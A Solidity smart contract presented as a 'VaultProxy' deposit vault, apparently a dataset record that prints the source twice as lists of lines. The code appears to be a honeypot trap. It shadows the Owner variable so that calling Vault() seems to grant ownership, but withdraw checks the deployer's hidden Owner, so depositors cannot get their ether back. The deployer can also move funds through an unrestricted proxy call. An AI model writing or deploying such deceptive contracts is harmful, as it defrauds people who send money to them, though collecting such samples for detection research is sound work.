['pragma solidity ^0.4.24;\n', '\n', 'contract Proxy  {\n', '    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n', '    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n', '    function proxy(address target, bytes data) public payable {\n', '        target.call.value(msg.value)(data);\n', '    }\n', '}\n', '\n', 'contract VaultProxy is Proxy {\n', '    address public Owner;\n', '    mapping (address => uint256) public Deposits;\n', '\n', '    function () public payable { }\n', '    \n', '    function Vault() public payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '    \n', '    function deposit() public payable {\n', '        if (msg.value > 0.5 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint256 amount) public onlyOwner {\n', '        if (amount>0 && Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '        }\n', '    }\n', '}']
['pragma solidity ^0.4.24;\n', '\n', 'contract Proxy  {\n', '    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n', '    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n', '    function proxy(address target, bytes data) public payable {\n', '        target.call.value(msg.value)(data);\n', '    }\n', '}\n', '\n', 'contract VaultProxy is Proxy {\n', '    address public Owner;\n', '    mapping (address => uint256) public Deposits;\n', '\n', '    function () public payable { }\n', '    \n', '    function Vault() public payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '    \n', '    function deposit() public payable {\n', '        if (msg.value > 0.5 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint256 amount) public onlyOwner {\n', '        if (amount>0 && Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '        }\n', '    }\n', '}']
